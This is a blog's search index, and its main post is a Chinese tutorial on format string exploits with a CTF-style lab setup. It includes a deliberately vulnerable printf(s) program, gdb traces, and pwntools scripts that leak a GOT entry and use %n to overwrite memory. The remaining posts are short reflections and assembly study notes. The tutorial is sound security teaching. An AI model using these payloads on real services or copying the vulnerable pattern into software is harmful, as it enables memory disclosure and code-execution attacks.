<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Format String Exploit</title>
      <link href="/2020/05/22/formal/"/>
      <url>/2020/05/22/formal/</url>
      
        <content type="html"><![CDATA[<pre><code>                   格式化字符串漏洞原理</code></pre><p>格式化字符串函数是根据格式化字符串函数来进行解析的。那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制。比如说’%s’表明我们会输出一个字符串参数。</p><p>对于这样的例子，在进入 printf 函数的之前 (即还没有调用 printf)，栈上的布局由高地址到低地址依次如下<br>some value   //未知量<br> 3.14 123456<br> addr of “red”<br> addr of format string: Color %s…</p><p>在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况<br>当前字符不是 %，直接输出到相应标准输出。<br>当前字符是 %， 继续读取下一个字符<br>如果没有字符，报错<br>如果下一个字符是 %, 输出 %<br>否则根据相应的字符，获取相应的参数，对其进行解析并输出</p><p>假设编写如下程序:<br>printf(“Color %s, Number %d, Float %4.2f”);<br>程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为<br>1.解析其地址对应的字符串<br>2.解析其内容对应的整形值<br>3.解析其内容对应的浮点值</p><p>#以上来源于<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr</a></p><p>漏洞利用</p><p>1：程序崩溃<br>因为栈上会有很多权限不足的地址无法进行访问，利用无法访问地址使程序崩溃<br>一般输入多个%s即可<br>2：泄露内存<br>获取某个变量的值，或是某个变量对应的地址<br>例：<br>程序如下：<br>#include &lt;stdio.h&gt;<br>int main() {<br>  char s[100];<br>  int a = 1, b = 0x22222222, c = -1;<br>  scanf(“%s”, s);<br>  printf(“%08x.%08x.%08x.%s\n”, a, b, c, s);<br>  printf(s);<br>  return 0;<br>}<br>简单编译并将防护关闭：gcc -m32 -fno-stack-protector -no-pie -o test test.c<br>（32位，关闭栈溢出防护，PIE）<br>根据 C 语言的调用规则，格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为其参数 (64 位会根据其传参的规则进行获取)。这里我们主要介绍 32 位。</p><p>获取栈变量数值：<br>%08x.%08x.%08x<br>00000001.22222222.ffffffff.%08x.%08x.%08x<br>ff9645f0.f7ee9410.0804849d</p><p>以上可以看出我们确实得到了3个16进制的数据。我们用gdb继续深入</p><p>首先再printf下断点：<br>gdb-peda$ b printf<br>Breakpoint 1 at 0x8048330<br>继续运行：<br>gdb-peda$ r<br>Starting program: /home/hunter/PWN/formal/wiki/test1<br>%08x.%08x.%08x  //我们还是输入%08x.%08x.%08x</p><p>回车继续运行，程序停在第一次调用printf处：<br>=&gt; 0xf7e2db60 <printf>:<br>    call   0xf7f11c79<br>   0xf7e2db65 &lt;printf+5&gt;:<br>    add    eax,0x18449b<br>   0xf7e2db6a &lt;printf+10&gt;:<br>    sub    esp,0xc<br>   0xf7e2db6d &lt;printf+13&gt;:<br>    mov    eax,DWORD PTR [eax-0x7c]<br>   0xf7e2db73 &lt;printf+19&gt;:<br>    lea    edx,[esp+0x14]<br>No argument<br>[————————————stack————————————-]<br>0000| 0xffffcfac –&gt; 0x80484ea (&lt;main+100&gt;:    )   //printf函数的返回地址<br>0004| 0xffffcfb0 –&gt; 0x8048593 (“%08x.%08x.%08x.%s\n”) printf函数第一个参数即格式化字符串<br>0008| 0xffffcfb4 –&gt; 0x1   //变量a的地址 （格式化字符串的第一个参数）<br>0012| 0xffffcfb8 (“&quot;&quot;&quot;&quot;\377\377\377\377\320\317\377\377\320\317\377\377\020\364\374\367\235\204\004\b%08x.%08x.%08x”)    //变量b，我不知道为啥是这么一大串，理论上是0x22222222<br>0016| 0xffffcfbc –&gt; 0xffffffff  //变量c<br>0020| 0xffffcfc0 –&gt; 0xffffcfd0 (“%08x.%08x.%08x”)  该变量是我们输入的格式化字符串对应的地址<br>0024| 0xffffcfc4 –&gt; 0xffffcfd0 (“%08x.%08x.%08x”)<br>0028| 0xffffcfc8 –&gt; 0xf7fcf410 –&gt; 0x8048278 (“GLIBC_2.0”)<br>[——————————————————————————]<br>Legend: code, data, rodata, value</p><p>Breakpoint 1, 0xf7e2db60 in printf<br>    () from /lib32/libc.so.6<br>gdb-peda$ </p><p>继续执行：<br>gdb-peda$ c<br>Continuing.<br>00000001.22222222.ffffffff.%08x.%08x.%08x<br>程序确实输出了每一个变量对应的数值，并停在第二个printf<br>=&gt; 0xf7e2db60 <printf>:    call   0xf7f11c79<br>   0xf7e2db65 &lt;printf+5&gt;:<br>    add    eax,0x18449b<br>   0xf7e2db6a &lt;printf+10&gt;:    sub    esp,0xc<br>   0xf7e2db6d &lt;printf+13&gt;:<br>    mov    eax,DWORD PTR [eax-0x7c]<br>   0xf7e2db73 &lt;printf+19&gt;:<br>    lea    edx,[esp+0x14]<br>No argument<br>[————————————stack————————————-]<br>0000| 0xffffcfbc –&gt; 0x80484f9 (&lt;main+115&gt;:    add    esp,0x10)<br>0004| 0xffffcfc0 –&gt; 0xffffcfd0 (“%08x.%08x.%08x”)<br>0008| 0xffffcfc4 –&gt; 0xffffcfd0 (“%08x.%08x.%08x”)<br>0012| 0xffffcfc8 –&gt; 0xf7fcf410 –&gt; 0x8048278 (“GLIBC_2.0”)<br>0016| 0xffffcfcc –&gt; 0x804849d (&lt;main+23&gt;:    add    ebx,0x1b63)<br>0020| 0xffffcfd0 (“%08x.%08x.%08x”)<br>0024| 0xffffcfd4 (“.%08x.%08x”)<br>0028| 0xffffcfd8 (“x.%08x”)<br>[——————————————————————————]<br>Legend: code, data, rodata, value</p><p>Breakpoint 1, 0xf7e2db60 in printf ()<br>   from /lib32/libc.so.6<br>gdb-peda$ </p><p>此时，由于格式化字符串为 %x%x%x，所以，程序 会将栈上的 0xffffcd04 及其之后的数值分别作为第一，第二，第三个参数按照 int 型进行解析，分别输出：<br>gdb-peda$ c<br>Continuing.<br>ffffcfd0.f7fcf410.0804849d[Inferior 1 (process 9574) exited normally]</p><p>想获取栈变量数值，我们一般用%p代替%08x。</p><p>这里需要注意的是，并不是每次得到的结果都一样 ，因为栈上的数据会因为每次分配的内存页不同而有所不同，这是因为栈是不对内存页做初始化的。</p><p>可以用%n$x来对应栈中第n+1个参数，因为对于printf函数格式化字符串就是栈中第一个参数，而格式化字符串后面的数据就是该格式化字符串内将被替换的参数</p><p>gdb再次深入：<br>Starting program: /home/hunter/PWN/formal/wiki/test1<br>%3$x</p><p>[———————————-registers———————————–]<br>EAX: 0x8048593 (“%08x.%08x.%08x.%s\n”)<br>EBX: 0x804a000 –&gt; 0x8049f14 –&gt; 0x1<br>ECX: 0x1<br>EDX: 0xf7fb389c –&gt; 0x0<br>ESI: 0xf7fb2000 –&gt; 0x1d4d6c<br>EDI: 0x0<br>EBP: 0xffffd048 –&gt; 0x0<br>ESP: 0xffffcfac –&gt; 0x80484ea (&lt;main+100&gt;:    add    esp,0x20)<br>EIP: 0xf7e2db60 (<printf>:    call   0xf7f11c79)<br>EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)<br>[————————————-code————————————-]<br>   0xf7e2db5b &lt;fprintf+27&gt;:    ret<br>   0xf7e2db5c:    xchg   ax,ax<br>   0xf7e2db5e:    xchg   ax,ax<br>=&gt; 0xf7e2db60 <printf>:    call   0xf7f11c79<br>   0xf7e2db65 &lt;printf+5&gt;:<br>    add    eax,0x18449b<br>   0xf7e2db6a &lt;printf+10&gt;:    sub    esp,0xc<br>   0xf7e2db6d &lt;printf+13&gt;:<br>    mov    eax,DWORD PTR [eax-0x7c]<br>   0xf7e2db73 &lt;printf+19&gt;:<br>    lea    edx,[esp+0x14]<br>No argument<br>[————————————stack————————————-]<br>0000| 0xffffcfac –&gt; 0x80484ea (&lt;main+100&gt;:    add    esp,0x20)<br>0004| 0xffffcfb0 –&gt; 0x8048593 (“%08x.%08x.%08x.%s\n”) //函数参数1<br>0008| 0xffffcfb4 –&gt; 0x1    //函数参数2<br>0012| 0xffffcfb8 (“&quot;&quot;&quot;&quot;\377\377\377\377\320\317\377\377\320\317\377\377\020\364\374\367\235\204\004\b%3$x”)    //函数参数3<br>0016| 0xffffcfbc –&gt; 0xffffffff  //函数参数4.。。。。<br>0020| 0xffffcfc0 –&gt; 0xffffcfd0 (“%3$x”)<br>0024| 0xffffcfc4 –&gt; 0xffffcfd0 (“%3$x”)<br>0028| 0xffffcfc8 –&gt; 0xf7fcf410 –&gt; 0x8048278 (“GLIBC_2.0”)<br>[——————————————————————————]<br>Legend: code, data, rodata, value</p><p>Breakpoint 1, 0xf7e2db60 in printf ()<br>   from /lib32/libc.so.6<br>gdb-peda$ </p><p>继续：<br>0xf7e2db60 <printf>:    call   0xf7f11c79<br>   0xf7e2db65 &lt;printf+5&gt;:<br>    add    eax,0x18449b<br>   0xf7e2db6a &lt;printf+10&gt;:    sub    esp,0xc<br>   0xf7e2db6d &lt;printf+13&gt;:<br>    mov    eax,DWORD PTR [eax-0x7c]<br>   0xf7e2db73 &lt;printf+19&gt;:<br>    lea    edx,[esp+0x14]<br>No argument<br>[————————————stack————————————-]<br>0000| 0xffffcfbc –&gt; 0x80484f9 (&lt;main+115&gt;:    add    esp,0x10) //第二次调用，返回地址<br>0004| 0xffffcfc0 –&gt; 0xffffcfd0 (“%3$x”)  //函参1<br>0008| 0xffffcfc4 –&gt; 0xffffcfd0 (“%3$x”)  // 2   （格式化参数1。。。）<br>0012| 0xffffcfc8 –&gt; 0xf7fcf410 –&gt; 0x8048278 (“GLIBC_2.0”)    //3<br>0016| 0xffffcfcc –&gt; 0x804849d (&lt;main+23&gt;:    add    ebx,0x1b63)   //4<br>0020| 0xffffcfd0 (“%3$x”)<br>0024| 0xffffcfd4 –&gt; 0x0<br>0028| 0xffffcfd8 –&gt; 0xf7ffd940 –&gt; 0x0<br>[——————————————————————————]<br>Legend: code, data, rodata, value</p><p>Breakpoint 1, 0xf7e2db60 in printf ()<br>   from /lib32/libc.so.6<br>gdb-peda$ </p><p>以此判断程序将输出0x804849d：</p><p>gdb-peda$ c<br>Continuing.<br>804849d[Inferior 1 (process 9897) exited normally]</p><p>当然，并不是所有这样的都会正常运行，如果对应的变量不能够被解析为字符串地址，那么，程序就会直接崩溃。</p><p>小结：</p><pre><code>    利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。    利用 %s 来获取变量所对应地址的内容，只不过有零截断。    利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。</code></pre><p>3：泄露任意地址内存<br>有时候，我们可能会想要泄露某一个 libc 函数的 got 表内容，从而得到其地址，进而获取 libc 版本以及其他函数的地址，这时候，能够完全控制泄露某个指定地址的内存就显得很重要了</p><p>一般来说我们所读取的变量值都是在栈上的，因为是某个函数的局部变量。</p><p>由于我们可以控制格式化字符串，如果我们知道输出函数调用时我们的格式化字符串是第几个参数就可以构造特定形式来获取某些addr，如：p32（addr）%K$s<br>我们可以用下面的方法确定参数偏移：<br>[tag]%p%p%p%p%p%p…</p><p>如：<br>AAAA%p%p%p%p%p%p%p%p<br>00000001.22222222.ffffffff.AAAA%p%p%p%p%p%p%p%p<br>AAAA0xff99da800xf7f814100x804849d0x414141410x702570250x702570250x702570250x70257025<br>所以得到参数位置是5，是格式化字符串的第4个参数</p><p>现在我们可以来访问某些函数的地址如scanf函数，首先找到其got地址<br>利用pwntools得：<br>from pwn import*</p><p>sh = process(“test1”)</p><p>elf = ELF(“test1”)</p><p>scanf_got = elf.got[‘__isoc99_scanf’]<br>print hex(scanf_got)</p><p>payload = p32(scanf_got) + ‘%4$s’<br>print payload</p><p>gdb.attach(sh)   //进一步调试</p><p>sh.sendline(payload)<br>sh.recvuntil(“%4$s\n”)</p><p>print hex(u32(sh.recv()[4:8]))</p><p>sh.interactive()</p><p>在脚本启动gdb后先finih直到main函数然后在printf下断点。<br>=&gt; 0xf7e25b60 <printf>:    call   0xf7f09c79<br>   0xf7e25b65 &lt;printf+5&gt;:<br>    add    eax,0x18449b<br>   0xf7e25b6a &lt;printf+10&gt;:    sub    esp,0xc<br>   0xf7e25b6d &lt;printf+13&gt;:<br>    mov    eax,DWORD PTR [eax-0x7c]<br>   0xf7e25b73 &lt;printf+19&gt;:<br>    lea    edx,[esp+0x14]<br>No argument<br>[————————————stack————————————-]<br>0000| 0xffefdd2c –&gt; 0x80484ea (&lt;main+100&gt;:    add    esp,0x20)<br>0004| 0xffefdd30 –&gt; 0x8048593 (“%08x.%08x.%08x.%s\n”)<br>0008| 0xffefdd34 –&gt; 0x1<br>0012| 0xffefdd38 (“&quot;&quot;&quot;&quot;\377\377\377\377P\335\357\377P\335\357\377\020t\374\367\235\204\004\b\024\240\004\b%4$s”)<br>0016| 0xffefdd3c –&gt; 0xffffffff<br>0020| 0xffefdd40 –&gt; 0xffefdd50 –&gt; 0x804a014 –&gt; 0xf7e38410 (&lt;<strong>isoc99_scanf&gt;:    push   ebp)<br>0024| 0xffefdd44 –&gt; 0xffefdd50 –&gt; 0x804a014 –&gt; 0xf7e38410 (&lt;</strong>isoc99_scanf&gt;:    push   ebp)<br>0028| 0xffefdd48 –&gt; 0xf7fc7410 –&gt; 0x8048278 (“GLIBC_2.0”)<br>[——————————————————————————]<br>Legend: code, data, rodata, value</p><p>Breakpoint 1, 0xf7e25b60 in printf ()<br>   from /lib32/libc.so.6<br>gdb-peda$ </p><p>可以看到第4个参数确实是scanf的在libc库中的地址</p><p>在调试结束后的terminal可以得到scanf的地址：<br>0x804a014<br>\x14\x04%4$s<br>[<em>] running in new terminal: /usr/bin/gdb -q  “./test1” 11351 -x “/tmp/pwn7ki8h7.gdb”<br>[+] Waiting for debugger: Done<br>0xf7d5e410<br>[</em>] Switching to interactive mode<br>[<em>] Process ‘./test1’ stopped with exit code 0 (pid 11351)<br>[</em>] Got EOF while reading in interactive<br>$  </p><p>有时候，我们需要对我们输入的格式化字符串进行填充，来使得我们想要打印的地址内容的地址位于机器字(32位4，64位8）长整数倍的地址处，一般来说，类似于下面的这个样子。<br>[padding][addr]</p><p>4：内存覆盖<br>只要变量对应的地址可写，我们就可以利用格式化字符串来修改其对应的数值：%n,<br>%n不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量</p><p>程序：<br>#include &lt;stdio.h&gt;<br>int a = 123, b = 456;<br>int main() {<br>  int c = 789;<br>  char s[100];<br>  printf(“%p\n”, &amp;c);<br>  scanf(“%s”, s);<br>  printf(s);<br>  if (c == 16) {<br>    puts(“modified c.”);<br>  } else if (a == 2) {<br>    puts(“modified a for a small number.”);<br>  } else if (b == 0x12345678) {<br>    puts(“modified b for a big number!”);<br>  }<br>  return 0;<br>}</p><p>基本构造格式如下：<br>…[overwrite addr]….%[overwrite offset]$n<br>其中… 表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数<br>步骤：<br>    确定覆盖地址<br>    确定相对偏移<br>    进行覆盖</p><p>确定覆盖地址：首先，我们自然是来想办法知道栈变量 c 的地址。由于目前几乎上所有的程序都开启了 aslr 保护，所以栈的地址一直在变，所以我们这里故意输出了 c 变量的地址。</p><p>确定相对偏移：其次，我们来确定一下存储格式化字符串的地址是 printf 将要输出的第几个参数 ()<br>hunter@hunter:~/PWN/formal/wiki$ ./test2<br>0xffebe8ac<br>AAAA%p%p%p%p%p%p%p%p%p<br>AAAA0xffebe8480xf7ef14100x80484bd(nil)0x10x414141410x702570250x702570250x70257025<br>所以是第7 个参数  =》  n为6</p><p>进行覆盖：<br>将c的地址放在n=6，然后利用%n来修改c的值<br>[addr of c]%012d%6$n    //addr of c 的长度为 4，故而我们得再输入 12 个字符才可以达到 16 个字符，以便于来修改 c 的值为 16。</p><p>Exp：<br>sh = process(‘test2’)<br>    c_addr = int(sh.recvuntil(‘\n’, drop=True), 16)  //drop ：是否保留<br>    print hex(c_addr)<br>    payload = p32(c_addr) + ‘%012d’ + ‘%6$n’<br>    print payload<br>    #gdb.attach(sh)<br>    sh.sendline(payload)<br>    print sh.recv()<br>    sh.interactive()</p><p>覆盖小数字：<br>下面的问题是将a改为2  因为a是全局变量，在data段地址可从ida获取<br>这里以 2 为例。可能会觉得这其实没有什么区别，可仔细一想，真的没有么？如果我们还是将要覆盖的地址放在最前面，那么将直接占用机器字长个 (4 或 8) 字节。显然，无论之后如何输出，都只会比 4 大。  （或许我们可以使用整形溢出来修改对应的地址的值，但是这样将面临着我们得一次输出大量的内容。而这，一般情况下，基本都不会攻击成功。）</p><p>我们当时只是为了寻找偏移，所以才把 tag 放在字符串的最前面，如果我们把 tag 放在中间，其实也是无妨的。类似的，我们把地址放在中间，只要能够找到对应的偏移，其照样也可以得到对应的数值。前面已经说了我们的格式化字符串的为第 6 个参数。由于我们想要把 2 写到对应的地址处，故而格式化字符串的前面的字节必须是：aa%k$naa  刚好占8字节所以我们的地址被挤到第n=8个参数</p><p>利用 ida 可以得到 a 的地址为 0x0804A024（由于 a、b 是已初始化的全局变量，因此不在堆栈中）。</p><p>.data:0804A024                 public a<br>.data:0804A024 a               dd 7Bh</p><p>故而我们可以构造如下的利用代码</p><pre><code>sh = process(&#39;test2&#39;)a_addr = 0x0804A024payload = &#39;aa%8$naa&#39; + p32(a_addr)sh.sendline(payload)print sh.recv()sh.interactive()</code></pre><p>其实，这里我们需要掌握的小技巧就是，我们没有必要必须把地址放在最前面，放在那里都可以，只要我们可以找到其对应的偏移即可。</p><p>覆盖大数字<br>我们得先再简单了解一下，变量在内存中的存储格式。首先，所有的变量在内存中都是以字节进行存储的。此外，在 x86 和 x64 的体系结构中，变量的存储格式为以小端存储，即最低有效位存储在低地址。举个例子，0x12345678 在内存中由低地址到高地址依次为 \ x78\x56\x34\x12</p><p>首先，我们还是要确定的是要覆盖的地址为多少，利用 ida 看一下，可以发现地址为 0x0804A028。</p><p>.data:0804A028                 public b<br>.data:0804A028 b               dd 1C8h                 ; DATA XREF: main:loc_8048510r</p><p>即我们希望将按照如下方式进行覆盖，前面为覆盖地址，后面为覆盖内容。</p><p>0x0804A028 \x78<br>0x0804A029 \x56<br>0x0804A02a \x34<br>0x0804A02b \x12</p><p>这里将构造一个推算代码：（本人不懂）<br>def fmt(prev, word, index):<br>    if prev &lt; word:<br>        result = word - prev<br>        fmtstr = “%” + str(result) + “c”<br>    elif prev == word:<br>        result = 0<br>    else:<br>        result = 256 + word - prev<br>        fmtstr = “%” + str(result) + “c”<br>    fmtstr += “%” + str(index) + “$hhn”<br>    return fmtstr</p><p>def fmt_str(offset, size, addr, target):<br>    payload = “”<br>    for i in range(4):<br>        if size == 4:<br>            payload += p32(addr + i)<br>        else:<br>            payload += p64(addr + i)<br>    prev = len(payload)<br>    for i in range(4):<br>        payload += fmt(prev, (target &gt;&gt; i * 8) &amp; 0xff, offset + i)<br>        prev = (target &gt;&gt; i * 8) &amp; 0xff<br>    return payload<br>payload = fmt_str(6,4,0x0804A028,0x12345678)</p><pre><code>offset 表示要覆盖的地址最初的偏移size 表示机器字长addr 表示将要覆盖的地址。target 表示我们要覆盖为的目的变量值。</code></pre><p>这其实就是pwntools的一个模块：当要写入很大的数时可以用pwntools的fmtstr模块：我们希望向0x08048000写入值0x10203040，在pwntools里，我们可以用命令fmtstr_payload。<br>payload = fmtstr_payload(6,{0x08048000:0x10203040}) // 即可 ， 6是偏移量。</p><p>详情:<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Thinking</title>
      <link href="/2019/12/08/her/"/>
      <url>/2019/12/08/her/</url>
      
        <content type="html"><![CDATA[<p>时间无限延长，爱，仅仅是低等文明的一个产物。<br>无论后世的万语千言，请把握我们特殊的文明。<br>For Her loving forever</p>]]></content>
      
      
      
        <tags>
            
            <tag> Her </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>I am here</title>
      <link href="/2019/11/30/look-here/"/>
      <url>/2019/11/30/look-here/</url>
      
        <content type="html"><![CDATA[<p>在有限中以无限去演绎，这才是美妙。</p>]]></content>
      
      
      
        <tags>
            
            <tag> The legend of 1900 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Stay or Leave?</title>
      <link href="/2019/11/30/where-are-you-going/"/>
      <url>/2019/11/30/where-are-you-going/</url>
      
        <content type="html"><![CDATA[<p>总有一条通向黑暗的隧道让你望眼欲穿</p>]]></content>
      
      
      
        <tags>
            
            <tag> Memories of Murder </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编学习</title>
      <link href="/2019/11/29/hello-world-0/"/>
      <url>/2019/11/29/hello-world-0/</url>
      
        <content type="html"><![CDATA[<p>在debug的T指令，如果执行修改ss寄存器的指令，接下来的一条指令也紧接着被执行。<br>具体原因将在后面提到</p><p>   4.1 一个源程序从写出到执行的过程<br>一个汇编语言程序从写出到最终执行的简要过程：<br>第一步：编写汇编源程序。结果是产生一个储存源程序的文本文件<br>第二 步：对源程序进行编译连接。使用汇编语言编译程序对源程序文件中的源程序进行编译，产生目标文件，再用连接程序进行连接，生成可在操作系统中直接执行的文件。</p><p>可执行文件包括三部分：程序（从编译指令翻译过来的机器码）和数据（源程序中定义的数据）以及相关信息的描述（需要占用多少内存之类的）<br>第三步：执行</p><p>操作系统根据文件中的描述信息，将可执行文件中的机器码和数据载入内存中，并进行一些初始化如设置cs：ip指向第一条要执行的指令，然后有cpu执行</p><pre><code>      4.2 源程序</code></pre><p>1：在一个汇编语言源程序中包含两种指令：汇编指令与伪指令<br>汇编指令有对应的机器指令可以被翻译并执行，顾名思义伪指令没有对应机器码翻译后无法执行。<br>  其实伪指令是由编译器来执行的指令，来调节编译工作<br>例子：</p><p>segment和ends：是一对成对使用的伪指令，他们的功能是定义一个段。这是在写可被编译器编译的汇编源程序时必须要用到的一对伪指令<br>格式：<br>     段名 segment<br>           ……..<br>           ……..<br>     段名 ends</p><p>一个汇编源程序是由多个段组成的，这些段用来存放代码，数据，或者当作栈空间。<br>一个源程序所有将被计算机处理的信息：指令，数据，栈，被划分到不同的段中</p><p>end:是一个汇编程序的结束标记，在编译过程中编译器遇到end就结束编译</p><p>Assume：“假设”   它假设某一段寄存器和程序中某个用segment。。。。。Ends定义的段相关联，以后编程时记得用assume将有特定用途的段和相关寄存器关联起来即可</p><p>2：源程序包括汇编指令和伪指令，其中汇编指令组成了由计算机执行的程序，这里的程序指源程序中由计算机执行，处理的指令或数据<br>以后将源程序文件中的所有内容称为源程序，其中由计算机执行，处理的指令或数据称为程序<br>除了汇编指令和伪代码，还有一些标号：如这里的codesg， 一个标号指代了一个地址。如codesg在segment前面作为一个段的名称，这个名称最终被编译连接程序处理为一个段的段地址。</p><p>运算2的3次的源程序：<br>1：定义一个段名为abc<br> Abc segment<br>      。。。<br>Abc ends<br>2：写入汇编指令，实现目标</p><p> Abc segment<br>     Mov ax，2<br>     Add ax，ax<br>     Add ax，ax<br>Abc ends<br>3：指出程序在何处结束<br> Abc segment<br>     Mov ax，2<br>     Add ax，ax<br>     Add ax，ax<br>Abc ends<br>End</p><p>4：abc被当作代码段来利用，所以将abc和cs联系起来<br>Assume cs：abc<br> Abc segment<br>     Mov ax，2<br>     Add ax，ax<br>     Add ax，ax<br>Abc ends<br>End</p><p>5：一个程序结束后，将cpu的控制权交还给使它，使cpu得以继续运行程序<br>所以在程序末尾添加返回的程序段<br>利用 mov ax，4c00H<br>     Int 21H        来实现<br>目前我们只要知道，在程序的末尾使用这两条指令就可以实现程序返回<br>Assume cs：abc<br> Abc segment<br>     Mov ax，2<br>     Add ax，ax<br>     Add ax，ax<br>     Mov ax，4c00H<br>     Int 21H<br>Abc ends<br>End</p><p>与结束相关的概念：</p><pre><code>    4.3 编辑源程序</code></pre><p>可以在任意文本编辑器上编写源程序，只要最终的格式为纯文本即可，保存后将后缀改为asm。如：</p><pre><code>       4.4 编译</code></pre><p>如上图：进入masm后在[.ASM]后面输入要编译的asm文件，此处我的asm文件与masm程序在一个文件里就不需要路径了。<br>然后出现object filename ：编译后的文件名称默认为1.obj<br>继续，出现source listing 这是编译过程的中间产物，可以不理会直接ENTER，以后讲<br>下面的cross-reference 也一样不管<br>最后的两行代码说明这个源程序没有警告错误和必须要改正的错误</p><p>对asm文件编译过后将在同一个文件夹产生1.obj这个编译结果</p><p>在编译过程中我们提供输入（asm文件）最多三个输出：目标文件(.OBJ)，列表文件(.LST)，交叉引用文件(.CRF)，目标文件是我们需要的最终结果，其他是中间结果可以暂时忽略</p><pre><code>      4.5 连接</code></pre><p>与使用masm编译类似第一个提示符：输入可执行文件的名称，这是我们需要的最终结果，下面2行暂时忽略<br>Libraries 这一行：提示输入库文件的名称，库文件里包含了一些可以调用的子程序，如果某个程序调用了就得将相应的库文件与这个目标文件连接，我们这个程序没有调用任何子程序，直接ENTER<br>最后一行：“没有栈段”，这个错误暂时不理会</p><p>第五章[EX]和loop指令<br>[bx]<br>[bx]与内存单元：<br>我们前面学过：[0]表示内存单元的偏移地址为0，其段地址存放在ds寄存器中。<br>那么类似的[bx]表示某个内存单元，其偏移地址在bx中，段地址在ds中。<br>两者根据进行操作的寄存器的长度（类型）表示对应的长度（类型）<br>比如：<br>Mov ax，[0]/[bx]    将某个内存单元的内容送入ax中，这个内存单元的长度为2字节（字单元）<br>Mov lx，[0]/[bx]    将某个内存单元的内容送入lx中，这个内存单元的长度为1字节（字节单元）<br>其中偏移地址在[bx]或偏移地址是0，段地址在ds中<br>[loop]<br>Cup在执行loop指令时会进行两步操作：1、（cx）=（cx）-1  （所以cx中的内容决定了循环次数）  2、判断（cx）的值，如果不为0则转向被标记的地址处执行相应指令，如果为0则向下执行。<br>例如：</p><p>在上图：从mov ax，2开始执行汇编指令，执行了带标号的指令（s）——add ax，ax后向下执行 loop s：对被s标号的指令重复执行，直到cx变为0</p><p>标号：在汇编语言中，标号代表一个地址，上程序有一个标号“s”。他实际上标识了一个地址，在这个地址处有一条指令：add ax，ax</p><p>要点：1、cx中存放循环次数<br>2、loop指令所标识的指令要在loop前面<br>3、需要循环的指令放在标号s 与  loop s之间</p><pre><code>      And和or指令</code></pre><p>And指令：逻辑与指令；按位进行与运算<br>将对应位变为0其他不变，如：<br>Mov al，11111010<br>Add al，01111111   //将al中的第七位变为0——01111010</p><p>Add al，10111111   //将al中的第六位变为0——10111010</p><p>Add al，11111110   //将al中第0位变为0——11111010</p><p>Or指令：逻辑或指令，按位进行或运算<br>将对应位变为1其他不变；如<br>Mov al，11111000<br>Or al，00011111   //将al中的后面5个数变为1——11111111</p><p>Add与0，or或1</p><pre><code>           Div指令</code></pre><p>Div指令用来进行除法运算<br>被除数÷除数=商+余数<br>被除数一般默认放在ax或 ax和dx。<br>除数放在reg（指寄存器）或内存单元中<br>结果放在ax或ax和dx</p><p>两种情况：被除数放在ax——ax是16位寄存器，对应除数应该是8位（字节型数据）。<br>          其结果有商和余数，其中商放在al中，余数放在ah中</p><pre><code>      被除数放在ax和dx中——组成32位（组成一个32位寄存器），对应除数应该是16位（字型数据）      被除数高位放在dx中，低位放在ax中。结果的商放在ax中，余数放在dx中</code></pre><p>高位放余数，低位放商</p><p>格式：<br>Div reg（或内存单元）<br>例如：</p><pre><code>     伪指令dd</code></pre><p>Dd：dword（double word 双字）型数据，用来定义一个双字型数据，还有类似的：<br>Db：define byte 定义字节型数据<br>Dw：define word 定义字型数据</p><p>如：<br>Data segment<br>db 1<br>dw 1<br>dd 1</p><p>Data ends<br>End<br>在data段中定义了三个数据<br>第一个是字节型数据在data:0处占一个字节<br>第二个是字型数据在data：1处占两个字节（一个字）<br>第三个是双字型数据在data:3处占四个字节（两个字）</p><p>dup操作符：与db，dw，dd等一样也是由编译器识别处理。他是和db，dw，dd等数据定义伪指令配合使用的，用来进行数据恢复</p><p>db 3 dup （0）<br>定义了三个字节，他们的值都是0<br>db 3 dup （1，2，3）<br>定义了9个字节，他们是1、2、3、1、2、3、1、2、3<br>定义一个200字节的栈段：<br> Stack segment<br>   db 200 dup（0）<br> Stack ends<br>可以看作将dup中的内容循环列出n次</p><pre><code>       操作符0ffset</code></pre><p>Offset是一个操作符，由编译器处理，作用是：取标号所对应地址的偏移地址<br>如：<br>Start：Mov ax，offset start——mov ax，0      （假设初始地址为0）<br>S：mov ax，offset s——mov ax，3       （上一条指令占3个字节）</p><p>如上图：操作符offset在debug调试中没有出现</p><pre><code>     Jmp指令</code></pre><p>1：依据位移进行转移：<br>Jmp short 标号 —— 执行后cs：ip指向标号地址处的指令<br>段内短转移，ip修改范围是-128~127：指令向下走为正，向上走为负</p><p>Jmp near ptr 标号 —— 执行后cs：ip指向标号地址处的指令<br>段内近转移，ip修改范围是-32768~32767：指令向下走为正，向上走为负</p><p>注：这两个指令“依据位移进行转移”原因是，short 标号或者near ptr 标号 由编译器处理，编译器根据标号地址算出位移地址给cpu使用<br>2：依据目标地址转移<br>Jmp far ptr 标号—— 执行后cs：ip都被修改为标号处的地址<br>段间转移，远转移,直接依据目标地址修改cs：ip</p><pre><code>         转移地址在寄存器jmp</code></pre><p>格式：<br>Jmp reg——ip变为（reg)</p><pre><code>        转移地址在内存中的jmp</code></pre><p>段内转移：<br>Jmp word ptr 内存地址  ：将寄存器ip中的数据改为，对应内存地址中的字数据<br>如：<br>Mov ax，0123h<br>Mov ds:[0]，ax<br>Jmp word ptr ds:[0]  //此处将ip改为（ds:[0]内的字数据）<br>执行后：（ip）=0123h</p><p>段间转移：<br>Jmp dword ptr 内存地址 